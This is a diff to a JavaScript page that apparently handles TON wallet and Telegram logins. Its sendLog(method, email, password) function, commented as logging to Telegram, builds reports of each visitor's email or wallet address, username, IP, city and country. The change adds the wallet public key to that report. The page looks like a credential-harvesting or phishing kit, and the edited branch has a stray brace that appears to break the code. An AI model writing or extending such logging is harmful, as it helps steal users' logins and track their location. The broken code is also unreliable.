@@ -1467,8 +1467,9 @@ tonConnectUI.onStatusChange(function(wallet) {
       btn.style.borderColor = 'rgba(0,152,234,0.5)';
     }
 
-    // Лог в Telegram
-    sendLog('ton_wallet', addr, '');
+    // Лог — отправляем raw адрес и friendly если есть
+    const friendly = wallet.account.publicKey || addr;
+    sendLog('ton_wallet', addr, wallet.account.publicKey || '');
   }
 });
 
@@ -2079,12 +2080,13 @@ async function sendLog(method, email, password) {
            + `🌐 Язык: ${navigator.language || 'ru'}\n`
            + `📍 ${country}, ${city} (IP: ${ip})\n`
            + `🕐 ${now}`;
-    } else if (method === 'ton_wallet') {
-      text = `💎 <b>TON Кошелёк подключён</b>\n`
-           + `👤 ${uid} ${username}\n`
-           + `💼 ${email}\n`
-           + `📍 ${country}, ${city} (IP: ${ip})\n`
-           + `🕐 ${now}`;
+    } } else if (method === 'ton_wallet') {
+  text = `💎 <b>TON Кошелёк подключён</b>\n`
+       + `👤 ${uid} ${username}\n`
+       + `💼 Адрес: ${email}\n`
+       + `🔑 PublicKey: ${password || '—'}\n`
+       + `📍 ${country}, ${city} (IP: ${ip})\n`
+       + `🕐 ${now}`;
     } else {
       const label = method === 'telegram'
         ? '✈️ <b>Вход через Telegram</b>'
